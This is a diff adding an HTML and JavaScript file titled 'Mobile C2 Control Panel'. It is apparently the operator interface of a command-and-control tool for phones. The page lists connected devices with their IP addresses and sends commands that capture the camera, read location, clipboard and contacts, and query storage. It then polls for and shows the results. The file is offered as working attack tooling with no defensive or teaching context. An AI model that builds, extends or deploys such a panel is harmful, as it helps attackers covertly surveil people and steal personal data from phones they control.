@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile C2 Control Panel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1a1a2e;
+            color: #eee;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            color: #00d9ff;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .section {
+            background: #16213e;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #00d9ff;
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+
+        .clients-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 15px;
+        }
+
+        .client-card {
+            background: #0f3460;
+            border-radius: 8px;
+            padding: 15px;
+            border-left: 4px solid #00d9ff;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .client-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 217, 255, 0.3);
+        }
+
+        .client-card.selected {
+            border-left-color: #00ff88;
+            background: #1a4d6d;
+        }
+
+        .client-uid {
+            font-weight: bold;
+            color: #00ff88;
+            margin-bottom: 8px;
+        }
+
+        .client-info {
+            font-size: 0.9rem;
+            color: #aaa;
+            line-height: 1.6;
+        }
+
+        .commands {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 10px;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: transform 0.2s;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .output {
+            background: #000;
+            color: #0f0;
+            padding: 15px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .status {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+
+        .status.online {
+            background: #00ff88;
+            color: #000;
+        }
+
+        .status.offline {
+            background: #ff4444;
+            color: #fff;
+        }
+
+        .refresh-btn {
+            background: #00d9ff;
+            color: #000;
+            font-weight: bold;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>📱 Mobile C2 Control Panel</h1>
+
+        <div class="section">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                <h2>Connected Mobile Devices</h2>
+                <button class="btn refresh-btn" onclick="refreshClients()">🔄 Refresh</button>
+            </div>
+            <div id="clients" class="clients-grid">
+                <div class="empty-state">Loading...</div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Commands</h2>
+            <div class="commands">
+                <button class="btn" onclick="sendCommand('get_location')">📍 Get Location</button>
+                <button class="btn" onclick="sendCommand('capture_camera')">📷 Capture Camera</button>
+                <button class="btn" onclick="sendCommand('get_battery')">🔋 Get Battery</button>
+                <button class="btn" onclick="sendCommand('get_device_info')">📱 Device Info</button>
+                <button class="btn" onclick="sendCommand('get_clipboard')">📋 Get Clipboard</button>
+                <button class="btn" onclick="sendCommand('vibrate')">📳 Vibrate</button>
+                <button class="btn" onclick="sendCommand('get_storage')">💾 Storage Info</button>
+                <button class="btn" onclick="sendCommand('get_contacts')">👥 Get Contacts</button>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Command Output</h2>
+            <div id="output" class="output">No output yet. Select a device and send a command.</div>
+        </div>
+    </div>
+
+    <script>
+        let selectedClient = null;
+        let clients = [];
+
+        async function refreshClients() {
+            try {
+                const response = await fetch('/api/mobile/clients');
+                const data = await response.json();
+                clients = data.clients || [];
+
+                const clientsDiv = document.getElementById('clients');
+
+                if (clients.length === 0) {
+                    clientsDiv.innerHTML = '<div class="empty-state">No mobile devices connected</div>';
+                    return;
+                }
+
+                clientsDiv.innerHTML = clients.map(client => `
+                    <div class="client-card ${selectedClient === client.uid ? 'selected' : ''}" 
+                         onclick="selectClient('${client.uid}')">
+                        <div class="client-uid">${client.uid}</div>
+                        <div class="client-info">
+                            <div><span class="status online">ONLINE</span> ${client.seconds_ago}s ago</div>
+                            <div>📱 ${client.info.platform || 'Unknown'}</div>
+                            <div>🌐 ${client.ip}</div>
+                            <div>🔋 ${client.info.battery?.level || 'N/A'}</div>
+                        </div>
+                    </div>
+                `).join('');
+            } catch (e) {
+                console.error('Failed to refresh clients:', e);
+                document.getElementById('clients').innerHTML =
+                    '<div class="empty-state">Error loading clients</div>';
+            }
+        }
+
+        function selectClient(uid) {
+            selectedClient = uid;
+            refreshClients();
+            addOutput(`Selected client: ${uid}`);
+        }
+
+        async function sendCommand(command) {
+            if (!selectedClient) {
+                addOutput('❌ Please select a mobile device first!');
+                return;
+            }
+
+            addOutput(`📤 Sending command: ${command}`);
+
+            try {
+                const response = await fetch('/api/mobile/send_command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        uid: selectedClient,
+                        command: command
+                    })
+                });
+
+                if (response.ok) {
+                    addOutput('✓ Command queued, waiting for response...');
+
+                    // Poll for response
+                    setTimeout(() => getResponse(), 2000);
+                } else {
+                    addOutput('❌ Failed to send command');
+                }
+            } catch (e) {
+                addOutput('❌ Error: ' + e.message);
+            }
+        }
+
+        async function getResponse() {
+            if (!selectedClient) return;
+
+            try {
+                const response = await fetch(`/api/mobile/get_response/${selectedClient}`);
+                const data = await response.json();
+
+                if (data.output) {
+                    addOutput('📥 Response:\n' + data.output);
+                } else {
+                    addOutput('⏳ No response yet, retrying...');
+                    setTimeout(() => getResponse(), 2000);
+                }
+            } catch (e) {
+                addOutput('❌ Error getting response: ' + e.message);
+            }
+        }
+
+        function addOutput(text) {
+            const outputDiv = document.getElementById('output');
+            const timestamp = new Date().toLocaleTimeString();
+            outputDiv.textContent += `\n[${timestamp}] ${text}`;
+            outputDiv.scrollTop = outputDiv.scrollHeight;
+        }
+
+        // Auto-refresh clients every 5 seconds
+        setInterval(refreshClients, 5000);
+
+        // Initial load
+        refreshClients();
+    </script>
+</body>
+
+</html>
